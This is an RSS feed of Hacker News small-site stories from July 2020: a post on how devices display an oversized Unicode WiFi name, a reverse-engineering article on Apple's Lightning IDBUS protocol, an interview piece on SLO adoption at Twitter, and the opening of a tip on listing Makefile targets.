<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 50]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 50. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Sat, 04 Jul 2020 08:16:34 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-50.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Sat, 04 Jul 2020 08:16:34 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Comparing how different devices display the SSID “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 24 (<a href="https://news.ycombinator.com/item?id=23708056">thread link</a>) | @herohamp
<br/>
July 1, 2020 | https://hamptonmoore.com/posts/weird-wifi-name-display/ | <a href="https://web.archive.org/web/*/https://hamptonmoore.com/posts/weird-wifi-name-display/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>After my recent post <a href="https://hamptonmoore.com/posts/fios-home-router-emoji/">Setting the SSID of a Fios Home Router to an emoji</a> I decided to set my WiFis SSID to “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”. That name is <a href="https://mothereff.in/byte-counter#a%CC%B6%CC%81%CC%93%CC%BF%CC%88%CC%9B%CC%9B%CD%90%CD%98%CD%86%CC%90%CD%9D%CC%87%CC%92%CC%91%CD%84aaa">36 octets</a> making it over the 32 octets maxium specified in the 2012 standard of 802.11 Section 6.3.11.2.2. My router just cut the name down to 32 octets though to stay complient. This was what was being sent according to <code>iw</code> <code>a\xcc\xb6\xcc\x81\xcc\x93\xcc\xbf\xcc\x88\xcc\x9b\xcc\x9b\xcd\x90\xcd\x98\xcd\x86\xcc\x90\xcd\x9d\xcc\x87\xcc\x92\xcc\x91\xcd</code> with the raw hex being <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc91cd</code>.</p> <p>I decided to see how this showed up on different devices and got some pretty strange results. Below are the devices tested sorted rougly to how they acted.</p> <p>Galaxy S8 running Android 9 with Kernel 4.4.153 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/android.jpg" alt=""></p> <p>Amazon Firestick <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/firestick.jpg" alt=""></p> <p>Both the s8 and the Firestick are rendering the result in what I deem as the correct way with it showing the name just with some of the vertical characters cutoff.</p> <p>iPhone running iOS 13.5.1 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/iphone-ios1351.jpg" alt=""></p> <p>Apple TV Second Generation <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/appletvgen2.jpg" alt=""></p> <p>Next comes the iPhone and Apple TV. At first I had no idea what they were rending these characters as. At first I thought it was just extended ascii but that third character, ∂, was not in extended ASCII. After asking around on the Apple discord server someone said it might be using the <a href="https://en.wikipedia.org/wiki/Mac_OS_Roman">Mac OS Roman</a> character set. It turns out it which is strange because iOS used UTF-8 internally and not Mac OS Roman as that was phased out with the release of Mac OS X.</p> <p>Speaking of Apple devices, there will not be any photos of MacOS though not from a lack of trying. I could not get either of my Macbook to acknowledge that this WiFi network existed. Neither the Wifi dropdown nor the airport commandline utility would show it.</p> <p>Windows 10 Pro 10.0.19041 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/windows10.png" alt=""></p> <p><del>Windows 10 is rendering it using what I believe to be the UTF-8 characters of each octet. This matches what the raw hex of the wifi name would become if you split it up into 8bit bytes and used that as UTF-8 chars.</del> It was pointed out by <a href="https://twitter.com/theFerdi265">@theFerdi265</a> that this is not the first set of UTF-8 chars like I thought. Instead it is <a href="https://en.wikipedia.org/wiki/Windows-1252">Windows-1252</a>, a single-byte character encoding of the Latin alphabet, used by default in the legacy components of Microsoft Windows for English and some other European languages.</p> <p>Chromebook running ChromeOS 83.0.4103.97 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/chromeos.jpg" alt=""></p> <p>ChromeOS is just freaking out not knowing how to render any of the charaters besides the singular a.</p> <p>Kindle Paperwhite running Firmware 5.10.2 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/kindlepaperwhite.jpg" alt=""></p> <p>Vizio M55-C2 TV <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/viziom55-c2.jpg" alt=""></p> <p>Both the Kindle and Vizio TV are showing what <code>iw</code> returned with the a and then escaped hexademical characters.</p> <p>I have no published a follow up to this post, <a href="https://hamptonmoore.com/posts/weird-wifi-names-cont/">here</a>.</p> <p>Discuss this post on Hacker News <a href="https://news.ycombinator.com/item?id=23708056">here</a></p> <hr> <p> Hello reader. I do not normally like to put advertisements or promotions on my website, but recently a good friend of my Jaden Ann Scrivener died in a car crash. She was known in the community as the most caring and energetic person around. She was a beam of sunshine and happiness brightening up the day of anyone who interacted with her. If you could <a href="https://www.aplos.com/aws/give/RayofHopeMedicalMissionsInc/Jaden">please donate to her memorial fund</a>. All the proceeds will go to the <a href="https://www.rohmm.org/">Ray of Hope Medical Missions</a> which facilitates life-changing surgeries, reduces infant mortality, and provides mission opportunities locally. </p> </article></div>]]>
            </description>
            <link>https://hamptonmoore.com/posts/weird-wifi-name-display/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23708056</guid>
            <pubDate>Wed, 01 Jul 2020 23:26:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple Lightning]]>
            </title>
            <description>
<![CDATA[
Score 499 | Comments 199 (<a href="https://news.ycombinator.com/item?id=23705546">thread link</a>) | @captn3m0
<br/>
July 1, 2020 | https://nyansatan.github.io/lightning/ | <a href="https://web.archive.org/web/*/https://nyansatan.github.io/lightning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

                
                <p>Created on 1.7.20</p>

                <p>
                    Here's my little article about (almost) everything I know about Apple Lightning and related technologies: <b>Tristar</b>, <b>Hydra</b>, <b>HiFive</b>, <b>SDQ</b>, <b>IDBUS</b> and etc. But first a tiny warning...
                </p>

                <p><i>
                        Read this article on your own <b>risk</b>! The information in this artcile is based on a lot of AppleInternal materials (leaked datasheets, schematics, source codes) I read in a diagonal direction. And of course on my own research too. I have to warn you, the reader, that I have never done such a research before. Thus, this write-up might use incorrect or just weird terms and turn out partially or completely <b>wrong</b>! 
                    </i>
                </p>

                <p>
                    Before going <i>deeper</i>, let's briefly sort out the terms:
                </p>

                <div>
                    <h2>What's Lightning?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_port_pinout.jpg"><br>

                    <b>Lightning</b> - is a digital interface used in most of the Apple's iOS devices since late 2012. Replaced the old 30-pin connector</p><p>

                    

                    You can see the female port pinout on the picture above and the connector pinout on the picture below:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/lightning_connector_pinout.jpg"><br>

                    Please pay attention to the fact that in the connector, pins on both sides of connector aren't wired in exact same order. Thus, a host device have to detect orientation of a cable before doing anything else</p><p>
                    
                    

                    Though it's not always applicable. Many Lightning accessories I've played with have mirrored pinouts in their connectors
                </p></div>

                <div>
                    <h2>What're Tristar and Hydra?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/tristar_logo.png"><br>

                    <b>Tristar</b> - is the integrated circuit embedded in every device shipped with Lightning female port. Basically, it's a MUX:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/tristar_schematic.png">

                    Among many other things, its main purpose is to communicate with Lightning male connector once one was connected - detect orientation and detect <b>Accessory ID</b> and route internal interfaces like USB, UART and SWD accordingly</p><p>

                    

                    <b>Hydra</b> - is the new variant of Tristar used since iPhone 8/X. The most significant change appears to be a support of wireless charging, but that's to be verified:<br>
                    
                    <img src="https://nyansatan.github.io/lightning/resources/hydra_schematic.png"><br>

                    There're 5 major Tristar/Hydra variants known to me:</p><ul>
                        <li><b>TI THS7383</b> - first-gen Tristar used in iPad mini 1 and iPad 4</li>
                        <li><b>NXP CBTL1608A1</b> - first-gen Tristar used in iPhone 5 and iPod touch 5</li>
                        <li><b>NXP CBTL1609A1</b> - mysterious first-gen Tristar used in iPod nano 7 - <a target="_blank" href="https://www.ifixit.com/Teardown/iPod+Nano+7th+Generation+Teardown/10826#s38931">source</a></li>
                        <li><b>NXP CBTL1610Ax</b> - second-gen Tristar used since iPhone 5C/5S and apparently everything else that doesn't support wireless charging. There're multiple generations of this one (<b>x</b> - number of generation)</li>
                        <li><b>NXP CBTL1612Ax</b> - Hydra used since iPhone 8/X and apparently everything else that supports wireless charging (<b>x</b> - number of generation)</li>
                    </ul><p>

                    From now on, I'll only use the term <b>Tristar</b>, but keep in mind that it will also mean <b>Hydra</b> as well, as they are very similar in the most of aspects that are gonna be covered in this text
                </p></div>

                <div>
                    <h2>What's HiFive?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/lightning_connector.svg"><br>

                    <b>HiFive</b> - is Lightning slave, i.e. a male connector. It contains a logical element as well - that chip is known as <b>SN2025</b>/<b>BQ2025</b>
                </p></div>

                <div>
                    <h2>What're SDQ and IDBUS?</h2>

                    <p><img src="https://nyansatan.github.io/lightning/resources/idbus_little.png"><br>

                    These 2 terms are often referred as kind of synonyms. For convinience, I'll only use term <b>IDBUS</b> from now on, as it seems more correct to me (and that's how this technology called in the THS7383 datasheet)</p><p>

                    

                    So, <b>IDBUS</b> - is a digital protocol used for negotiations between Tristar and HiFive. Very similar to <a target="_blank" href="https://en.wikipedia.org/wiki/1-Wire">Onewire protocol</a></p></div>

                <div>
                    <h2>Now we can play</h2><p>

                    Let's sniff the negotiations between Tristar and HiFive. Take a logic analyzer, a Lightning male-to-female passthrough breakout board, some accessory (normal Lightning to USB cable would fit just fine) and of course some device with Lightning port</p><p>

                    

                    First connect logic analyzer's channels to both <b>ID</b> lines of the breakout (pins 4 and 8) and connect the breakout to the device, but do not connect the accessory just yet:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_1.jpg"><br>

                    Right after that start sampling (any rate from 2 MHz and up should be fine). You'll see something like this:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/id_lines_activity.png"><br>

                    As you can see, Tristar polls each ID line by rotation - one after another. But since we didn't connect any accessory, the polling obviously fails. At some point the device will grow tired of this endless stream of failures and stop it. Meanwhile let's examine what exactly happens while polling:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/polling_explained_1.png"><br>

                    First, we can see a long interval (~1.1 milliseconds) when the level is just high and nothing else is happening:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/charge.png"><br>

                    Apparently that time is used to charge internal HiFive's capacitor - the energy from it will be then used to power-up its internal logic chips</p><p>

                    

                    What happens next is far more interesting:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful.png"><br>

                    Obviously, that's some data flowing. But how to interpret it? How to decode it? Let's virtually split it to almost the least least significant parts - to something that I call <b>words</b>:

                    <img src="https://nyansatan.github.io/lightning/resources/meaningful_splitted.png"><br>

                    So basically a <b>word</b> is a combination of <b>fall</b>-<b>rise</b>-<b>fall</b>:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/word_splitted.png"></p><ul>
                        <li><span>Meaningful Stage</span> - time interval taken by this stage defines meaning of a word</li>
                        <li><span>Recovery Stage</span> - time interval which is apparently required for processing the <span>Meaningful Stage</span> on recieving side and/or preparing the next word on sending stage</li>
                    </ul><p>

                    Here is a table of known word types with their time intervals for both stages we discussed above (all units are in microseconds):</p><table>
                        <tbody><tr>
                            <th></th>
                            <th colspan="3">Meaningful</th>
                            <th colspan="2">Recovery</th>
                        </tr>
                        <tr>
                            <th>Word</th>
                            <th>Min</th>
                            <th>Typ</th>
                            <th>Max</th>
                            <th>Min</th>
                            <th>Typ</th>
                        </tr>
                        <tr>
                            <td><b>BREAK</b></td>
                            <td>12</td>
                            <td>14</td>
                            <td>16</td>
                            <td>2.5</td>
                            <td>4.5</td>
                        </tr>
                        <tr>
                            <td><b>WAKE</b></td>
                            <td>22</td>
                            <td>24</td>
                            <td>27</td>
                            <td></td>
                            <td>1100?</td>
                        </tr>
                        <tr>
                            <td><b>ZERO</b></td>
                            <td>6</td>
                            <td>7</td>
                            <td>8</td>
                            <td></td>
                            <td>3</td>
                        </tr>
                        <tr>
                            <td><b>ONE</b></td>
                            <td>1</td>
                            <td>1.7</td>
                            <td>2.5</td>
                            <td></td>
                            <td>8.5</td>
                        </tr>
                        <tr>
                            <td><b>ZERO with STOP*</b></td>
                            <td>6</td>
                            <td>7</td>
                            <td>8</td>
                            <td></td>
                            <td>16</td>
                        </tr>
                        <tr>
                            <td><b>ONE with STOP*</b></td>
                            <td>1</td>
                            <td>1.7</td>
                            <td>2.5</td>
                            <td></td>
                            <td>21</td>
                        </tr>
                    </tbody></table>

                    <p>

                    * - <b>STOP</b> is used when it's a last bit in a byte</p><p>

                    

                    Using the above table we can now build a simple decoder of the protocol:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/decoded.png"><br>

                    As you can see, the first word a host sends is <b>BREAK</b> - when Tristar wants to send a new request, it always starts with it. Then comes a data stage. Please pay attention to the fact that last (8th) bit of a byte has longer <span>Recovery Stage</span>. When a data stage is over, a host sends another <b>BREAK</b>. Then a slave must send a reply (after at least a 2.5 us delay - see the table). Tristar will wait for around 2.2 ms for a reply. If it's not issued in this time interval, Tristar will try to poll another ID line</p><p>

                    

                    Now let's examine the data stage on the example above - <span>0x74 0x00 0x02 0x1f</span>:

                    </p><ul>
                        <li><span>0x74</span> - request/response type. Always even for request, always odd for response (request type + 1)</li>
                        <li><span>0x00 0x02</span> - actual data. Can be empty</li>
                        <li><span>0x1f</span> - CRC8 of both the request type byte and the whole data (polynomial - 0x31, initial value - 0xff)</li>
                    </ul><p>

                    Let's connect some accessory to our setup and see what happens. I'll use Apple's original Lightning to USB cable:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/setup_2.jpg"><br>

                    And here is what appears on IDBUS after a 0x74 request:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x75.png"><br>

                    HiFive replied! And if you scroll further you'll see a lot of other request/response pairs:<br>

                    <img src="https://nyansatan.github.io/lightning/resources/response_0x79.png"><br>

                    Some requests do not need a response though:

                    <img src="https://nyansatan.github.io/lightning/resources/request_0x84.png"><br>
                </p></div>

                <div>
                    <h2>Interpreting IDBUS requests and responses</h2><p>

                    The most important IDBUS request is <b>0x74</b> - it is used for two purposes: to tell HiFive enable full current (in case that's supported by an accessory) and to ask it about pin configuration the cable supports and some other metadata</p><p>

                    

                    Not too much is known about how response 0x75's data is encoded. But some bits were available in a certain old Tristar datasheet:</p><table>
                        <caption>First byte of 0x75 response data</caption>
                        <tbody><tr>
                            <th>7</th>
                            <th>6</th>
                            <th>5</th>
                            <th>4</th>
                            <th>3</th>
                            <th>2</th>
                            <th>1</th>
                            <th>0</th>
                        </tr>
                        <tr>
                            <td colspan="2">ACCx</td>
                            <td colspan="2">Dx</td>
                            <td colspan="4">DATA[43:40]</td>
                        </tr>
                    </tbody></table>

                    <br>

                    <div>
                        <table>
                            <caption>ACCx configuration when ID is found on ID0</caption>
                            <tbody><tr>
                                <th>ACCx[1:0]</th>
                                <th>ACC1</th>
                                <th>ACC2</th>
                                <th>HOST_RESET</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z (IDBUS)</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>UART1_RX</td>
                                <td>UART1_TX</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>JTAG_DIO</td>
                                <td>JTAG_CLK</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>HIGH</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>ACCx configuration when ID is found on ID1</caption>
                            <tbody><tr>
                                <th>ACCx[1:0]</th>
                                <th>ACC1</th>
                                <th>ACC2</th>
                                <th>HOST_RESET</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z (IDBUS)</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>UART1_RX</td>
                                <td>UART1_TX</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>JTAG_DIO</td>
                                <td>JTAG_CLK</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>HIGH</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>Dx configuration when ID is found on ID0</caption>
                            <tbody><tr>
                                <th>Dx[1:0]</th>
                                <th>DP1</th>
                                <th>DN1</th>
                                <th>DP2</th>
                                <th>DN2</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>UART1_TX</td>
                                <td>UART1_RX</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                        </tbody></table>
                    </div>

                    <br>

                    <div>
                        <table>
                            <caption>Dx configuration when ID is found on ID1</caption>
                            <tbody><tr>
                                <th>Dx[1:0]</th>
                                <th>DP1</th>
                                <th>DN1</th>
                                <th>DP2</th>
                                <th>DN2</th>
                            </tr>
                            <tr>
                                <td><b>00</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                            <tr>
                                <td><b>01</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                            </tr>
                            <tr>
                                <td><b>10</b></td>
                                <td>USB0_DP</td>
                                <td>USB0_DN</td>
                                <td>UART1_TX</td>
                                <td>UART1_RX</td>
                            </tr>
                            <tr>
                                <td><b>11</b></td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                                <td>Hi-Z</td>
                            </tr>
                        </tbody></table>
                    </div>
                    <p>

                    Using the tables above let's decode our cable's ID (<span>10 0C 00 00 00 00</span>) with keeping in mind that ID line was found on ID0 pin:<br>

                    h
                    </p><table>
                        <caption>First byte of the cable's 0x75 response data</caption>
                        <tbody><tr>
                            <th>7</th>
                            <th>6</th>
                            <th>5</th>
                            <th>4</th>
                            <th>3</th>
                            <th>2</th>
                            <th>1</th>
                            <th>0</th>
                        </tr>
                        <tr>
                            <td colspan="2">ACCx</td>
                            <td colspan="2">Dx</td>
                            <td colspan="4">DATA[43:40]</td>
                        </tr>
                        <tr>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                            <td>1</td>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                            <td>0</td>
                        </tr></tbody></table>
    
                    <p>

                    So, ACCx is <span>00</span> meaning that ID0 pin will just stick with IDBUS, and Dx is <span>01</span> meaning that DP1/DN1 pins will be configured as USB0_DP/USB0_DN. Just …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://nyansatan.github.io/lightning/">https://nyansatan.github.io/lightning/</a></em></p>]]>
            </description>
            <link>https://nyansatan.github.io/lightning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23705546</guid>
            <pubDate>Wed, 01 Jul 2020 19:37:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SLO Adoption at Twitter]]>
            </title>
            <description>
<![CDATA[
Score 72 | Comments 4 (<a href="https://news.ycombinator.com/item?id=23702876">thread link</a>) | @hannahblameless
<br/>
July 1, 2020 | https://www.blameless.com/blog/slo-adoption-twitter | <a href="https://web.archive.org/web/*/https://www.blameless.com/blog/slo-adoption-twitter">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><br><em>This is the second article of a two-part series. Click </em><a href="http://www.blameless.com/blog/twitters-reliability-journey"><em>here</em></a><em> for part 1 of the interview with Brian, Carrie, JP, and Zac to learn more about </em><a href="https://www.blameless.com/blog/twitters-reliability-journey"><em>Twitter’s SRE journey</em></a><em>.</em><br></p><p><a href="https://www.blameless.com/blog/twitters-reliability-journey">Previously</a>, we saw how SRE at Twitter has transformed their engineering practice to drive production readiness at scale. The concept of service level objectives (SLOs) and error budgets have been key to this transformation, as SLOs shape an organization’s ability to make data-oriented decisions around reliability. (Read <a href="https://www.blameless.com/how-slos-transformed-evernote/">here</a> for a definition of SLOs and how they transformed Evernote). Today, the Twitter team has invested in centralized tooling to measure, track, and visualize SLOs and their corresponding error budgets.&nbsp;<br></p><p>However, successfully implementing SLOs is far easier said than done. Many organizations have struggled with adoption for a number of reasons. Common obstacles include getting stakeholder buy-in, not knowing what (and how) to measure, and confusion over how to make SLOs actionable.&nbsp;&nbsp;<br></p><p>While the Twitter engineering team had laid a very strong foundation around observability and reliability, it took several important breakthroughs before SLOs began achieving broader adoption within the organization and the journey continues.<br></p><h3>The foundations for SLO</h3><p>Prior to SLOs, the engineers had used service level indicators (SLIs) for many years.&nbsp; The SLIs drew from Twitter’s extensive instrumentation of infrastructure and investments in their observability stack. Their observability stack provided a foundation for measuring service health with indicators such as success rate, latency, and throughput across their distributed service ecosystem. For example, the team would monitor the success rate for user-facing HTTP services, which they computed by looking at HTTP 500 errors versus total requests.&nbsp;<br></p><p>Integrating the SLIs with alerts and on-call rotations had been a core practice within their engineering teams for years.&nbsp; Additionally, their focus on incident management and postmortems has enabled them to continuously learn from their always evolving production ecosystem.<br></p><p>A significant inflection point came with embedding the concept of SLO within <a href="https://twitter.github.io/finagle/">Finagle</a>, Twitter’s RPC library, which is maintained by the Core Systems Libraries (CSL) team. As mentioned in the previous post, Finagle delivers reliability features such as load balancing, circuit breakers, failure detectors, and more, filling them inside every single piece of software that runs. In 2018, the CSL team made SLOs a first-class entity in the Twitter internal version of Finagle, creating a foundational API building block that is tied to a service boundary, which they call an objective. This was transformative in that it allowed the team to begin defining service-to-service interactions and modeling beyond just an alert, creating a programmatic definition that the team could now use to inform runtime decisions.&nbsp;<br></p><p>The Twitter team supported the implementation with proposals for projects and use cases that could use the SLO feature, and initially delivered the configuration as well as realtime per-instance measurement of SLOs.&nbsp;&nbsp;<br></p><p>In its initial phases, adoption of the feature was limited. Service owners could configure SLOs, but due to a lack of tooling and benefits automatically associated with turning SLOs on, there was little incentive to do so in context of other priorities.<br></p><p>Seeing this, the team invested in follow-up work. They began to build integrations and solutions for service owners on top of SLOs, such as load-shedding based on SLOs as they provided more useful context than a related metric like CPU throttling. Through piloting such enhancements, the appetite for adoption began to increase.&nbsp;<br></p><h3>Defining SLOs</h3><p>In thinking about how to define SLOs, the Twitter team typically begins by considering which features are key, and ensuring that they're well instrumented and understood.<br></p><p>It’s important to identify the signals that best reflect a critical user experience. Some signals for service success rate can provide color but are not so straightforward to interpret. For example, in analyzing the service error rate inside the data center, the client might retry those requests, making it a faulty datapoint to reason around what the true user success rate is.<br></p><p>Once the team sets a reasonable SLO at the top level, that will drive down through the services that a boundary depends on. Every service has a multitude of service dependencies, and thus the latency and success SLOs for all upstream and downstream services must all work together in context of the defined boundary. SLOs enable a more holistic way of measuring the whole call path.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 	</p><h3>A major turning point: tying SLOs to error budgets</h3><p>The introduction of error budgets marked another critical inflection point in Twitter’s adoption of SLOs. Error budgets make SLOs actionable and provide a different lens to understand a service over time, so they were an important follow-on feature after the original delivery of SLOs.&nbsp;<br></p><p>Error budgets look at the SLO over time, and thus have allowed the team to begin tracking performance by providing a historical view into how the service met objectives through different timeframes. The traditional metric view tends to be shortsighted, and can bury signals around valuable trends and opportunities. Instead of a dashboard that charts hundreds of metrics, error budgets become a forcing function to pick a few of the most important metrics, and get deeper into how and why they change over time.&nbsp;<br></p><p>An important note is that the team does not prescribe a fixed set of actions upon the exhaustion of the error budget. While error budgets can be a powerful tool, the true value has to resonate with engineering and product teams.&nbsp;<br></p><p>With the notion of “<a href="https://www.linkedin.com/pulse/netflixs-context-control-how-does-work-steve-urban/">context, not control</a>” (coined by Netflix), there is strong emphasis on empowering well-intentioned, capable teammates with visualizations and insights to allow them to make better decisions. In the same way, Twitter SREs apply ongoing experimentation to understand what other team members will view as valuable to measure. They understand that error budgets are more about giving team members good tools and context; there is no one policy fits all.&nbsp;&nbsp;<br></p><p>For example, one team hypothesized that the error budget would help inform when automated deploys could proceed, and specifically, whether to pause a deploy if the error budget was exhausted.&nbsp; But what they found was that sometimes the deploy being paused or blocked could contain the fix for the increased errors. Thus, that simple rule of “block deploys if no error budget remains” quickly began to fall apart. The very deploy getting blocked could decrease the volume or rate of errors, and possibly even defend the SLO and enable it to be met over its remaining duration of time.&nbsp;<br></p><p>Bearing in mind that they aren’t necessarily meant to be prescriptive, error budgets provide very useful suggestions for service owners in thinking about how to prioritize work. They create an important ‘runway’ for scaling the pace of innovation up or down. For example, overly rapid error budget burndown could be a sign to prioritize mitigation work for the current on-call or an upcoming sprint. Alternatively, not using enough of the error budget could nudge the team to iterate on feature work faster, or experiment more.&nbsp;</p><h3>The benefits of SLO</h3><p>While the team is still early in its adoption of SLOs, they’ve already seen the immense potential and value of SLOs in several ways.&nbsp;<br></p><p><strong><em>From a ‘distributed service zoo’ to a shared language</em></strong></p><p>Twitter has hundreds, if not thousands, of services, making its infrastructure a complex beast to understand. The current members of the Twitter Command Center (TCC) have been around long enough where they generally know what most of the services are and how services ‘snap together’. However, they know that eventually they will reach a point where that becomes impossible, where no one individual can grok how it all works. By investing in SLOs now to help guide discussions, the goal is that by the time they reach that point of un-knowable complexity, they will have set themselves up to manage service metrics programmatically.<br></p><p><strong><em>The right amount of context</em></strong></p><p>Context is the key. Dashboards can easily have hundreds of charts which translate into thousands of metrics. Teams might have tens or hundreds of alerts on their services across multiple data centers. These dashboards, metrics, and alerts are helpful for those running those services, but they're very high context, and information overload for anyone else.&nbsp;<br></p><p>SLOs create the ability to have more directed conversations with shared context. Instead of looking at a hundred pictures of a dashboard, the team can align on the four or five things that matter. lf any of those are not green, others can understand that something's not right without having to know anything else about the service.<br></p><p><strong><em>Dynamic load balancing and load shedding</em></strong></p><p>By making SLOs a first class entity, services can speak it at the programming level, beyond just measuring it. This enables the team to make systematic improvements using SLOs as a building block. For example, the team is exploring whether back pressure in Finagle can instead be SLO-based.<br></p><p>With Finagle, services can programmatically detect when they are under load (typically with second class signals such as CPU), and then signal to redirect traffic to another instance. Instead of relying on second class signals to implement back pressure, a service can directly know if it’s trending towards an SLO violation in order to signal back pressure and reduce load on itself.<br></p><p><strong><em>Graceful degradation</em></strong></p><p>One of the Twitter team’s goals for SLO is in gracefully degrading services during large-scale events to ensure that core functionality is always available. Rather than an all-or-nothing failure mode, the team aims to gracefully degrade services by stripping away peripheral features while maintaining core functionality.<br></p><p>The Twitter team is interested in utilizing SLOs to implement a selective circuit breaker pattern to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.blameless.com/blog/slo-adoption-twitter">https://www.blameless.com/blog/slo-adoption-twitter</a></em></p>]]>
            </description>
            <link>https://www.blameless.com/blog/slo-adoption-twitter</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702876</guid>
            <pubDate>Wed, 01 Jul 2020 15:55:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to list all the targets on a Makefile]]>
            </title>
            <description>
<![CDATA[
Score 129 | Comments 54 (<a href="https://news.ycombinator.com/item?id=23702756">thread link</a>) | @diamantidis_io
<br/>
July 1, 2020 | https://diamantidis.github.io/tips/2020/07/01/list-makefile-targets | <a href="https://web.archive.org/web/*/https://diamantidis.github.io/tips/2020/07/01/list-makefile-targets">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><code>make</code> is great tool to orchestrate the setup and build process of a project. It expects a <code>Makefile</code>, where we define targets to execute, like for example <code>install</code> and <code>run</code>. Then we can use <code>make install</code> and <code>make run</code> to execute those tasks.</p> <p>While target names like <code>install</code> are quite common, the problems arise when we have to deal with a lengthy <code>Makefile</code>, and we are not aware of all the available targets.</p> <p>Hopefully, with a slight modification of our current <code>Makefile</code> and the addition of a new target, we can expose this information and access it from the Terminal app. Let’s see how!</p> <p>First, we will have to document each of the existing targets. To do so, we will add a comment starting with <code>##</code> right after the target’s name.</p> <div><div><pre><code><span>install</span>: <span>## Install </span>
	@echo <span>"Installing..."</span>

run: <span>## Run</span>
	@echo <span>"Running..."</span>
